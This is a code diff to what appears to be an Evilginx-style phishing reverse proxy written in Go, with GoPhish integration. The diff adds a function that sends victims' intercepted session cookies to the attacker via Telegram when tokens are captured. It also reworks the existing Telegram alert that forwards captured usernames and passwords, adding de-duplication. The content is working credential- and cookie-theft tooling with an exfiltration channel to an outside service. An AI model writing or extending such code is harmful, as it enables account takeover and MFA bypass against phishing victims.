@@ -1073,6 +1073,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.Finish(false)
 
+						// Send Telegram notification with cookies (separate from credentials)
+						p.sendCookiesNotification(ps.SessionId)
+
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
@@ -1211,6 +1214,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								// Send Telegram notification with cookies
+								p.sendCookiesNotification(ps.SessionId)
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -1609,10 +1614,19 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	}
 }
 
+// sendTelegramNotification sends credentials notification (username/password only, no cookies)
 func (p *HttpProxy) sendTelegramNotification(sid string) {
 	if sid == "" {
 		return
 	}
+	// Check if notification was already sent for this session
+	if s, ok := p.sessions[sid]; ok {
+		if s.CredentialsNotificationSent {
+			return // Already sent, don't send duplicate
+		}
+		s.CredentialsNotificationSent = true
+	}
+
 	// Fetch the session from database to get all details
 	session, err := p.db.GetSessionBySid(sid)
 	if err != nil {
@@ -1622,8 +1636,37 @@ func (p *HttpProxy) sendTelegramNotification(sid string) {
 	// Only send if we have both username and password
 	if session.Username != "" && session.Password != "" {
 		go func() {
-			if err := p.telegram.SendSessionNotification(session); err != nil {
-				log.Error("telegram: %v", err)
+			if err := p.telegram.SendCredentialsNotification(session); err != nil {
+				log.Error("telegram credentials: %v", err)
+			}
+		}()
+	}
+}
+
+// sendCookiesNotification sends cookies notification when tokens are captured
+func (p *HttpProxy) sendCookiesNotification(sid string) {
+	if sid == "" {
+		return
+	}
+	// Check if notification was already sent for this session
+	if s, ok := p.sessions[sid]; ok {
+		if s.CookiesNotificationSent {
+			return // Already sent, don't send duplicate
+		}
+		s.CookiesNotificationSent = true
+	}
+
+	// Fetch the session from database to get all details
+	session, err := p.db.GetSessionBySid(sid)
+	if err != nil {
+		log.Error("telegram: failed to get session for cookies: %v", err)
+		return
+	}
+	// Only send if we have cookies
+	if len(session.CookieTokens) > 0 {
+		go func() {
+			if err := p.telegram.SendCookiesNotification(session); err != nil {
+				log.Error("telegram cookies: %v", err)
 			}
 		}()
 	}
